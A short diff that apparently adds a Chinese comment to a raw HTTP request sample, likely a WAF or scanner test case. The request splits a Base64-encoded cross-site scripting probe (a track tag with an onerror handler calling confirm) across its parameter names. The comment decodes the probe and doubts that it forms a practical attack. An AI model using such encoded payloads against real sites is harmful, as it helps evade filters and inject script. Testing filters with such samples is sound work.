@@ -1,3 +1,4 @@
+#将所有参数名（或参数值）按顺序拼接,对拼接结果进行 Base64 解码,><track/onerror=&#x27;confirm\%601\%60&#x27;> .但实际很难形成攻击
 GET /?&IzM0Ow==&Z3Q7&lt;track/onerror=&I3gyNztjb25maXJtXCU2MDFcJTYw&I3gyNzs=&Z3Q7 HTTP/1.1
 Host: 10.20.186.207:1111
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
